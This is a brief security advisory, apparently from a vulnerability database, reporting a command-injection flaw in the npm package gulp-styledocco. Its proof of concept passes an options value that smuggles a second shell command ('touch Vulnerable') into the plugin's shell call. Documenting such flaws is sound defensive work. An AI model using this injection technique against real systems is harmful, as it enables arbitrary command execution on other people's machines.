  title: Command Injection
  description: "[gulp-styledocco][1] is a StyleDocco plugin for gulp.\n\nAffected
    versions of this package are vulnerable to Command Injection.\nThe argument `options`
    of the exports function in `index.js` can be\ncontrolled by users without any
    sanitization.\n\n### PoC   {#poc}\n\n    var root = require(\"gulp-styledocco\");\n
    \   var gulp = require(\"gulp\");\n    var options = {\n      opt: 'docs',\n      name:
    \"123\\\"& touch Vulnerable& \\\"\"\n    }\n    \n    gulp.src(\"./gulp-styledocco.js\")\n
    \     .pipe(root(options));\n\n\n\n[1]: https://www.npmjs.com/package/gulp-styledocco\n"
